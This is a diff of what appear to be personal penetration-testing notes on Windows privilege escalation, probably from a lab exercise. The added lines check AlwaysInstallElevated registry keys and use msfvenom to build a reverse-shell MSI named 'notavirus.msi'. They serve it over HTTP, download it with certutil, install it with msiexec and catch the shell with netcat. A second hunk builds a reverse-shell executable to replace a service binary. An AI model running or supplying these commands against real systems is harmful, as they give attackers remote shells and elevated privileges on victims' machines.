@@ -129,11 +129,20 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
  
  
 ================================== 
-AlwaysInstallElevated
+AlwaysInstallElevated 
  
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer 
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
+
 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer 
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer 
-  
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.162.46 LPORT=445 -f msi > notavirus.msi 
+python3 -m http.server 80
+certutil -urlcache -split -f http://192.168.162.46:80/notavirus.msi 
+.\notavirus.msi 
+msiexec /i "C:\Users\shenzi\Downloads\notavirus.msi" 
+nc -nvlp 445
  
  
 ================================== 
@@ -378,7 +387,7 @@ Invoke-AllChecks
 
 Found Exploitable Service
 msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.162.46 LPORT=80 -f exe -o mike80.exe 
-webup 80 
+python3 -m http.server 80
 certutil -urlcache -split -f http://192.168.162.46:80/mike80.exe 
 cd C:\xampp\fz\ 
 move fz.exe fz.old 
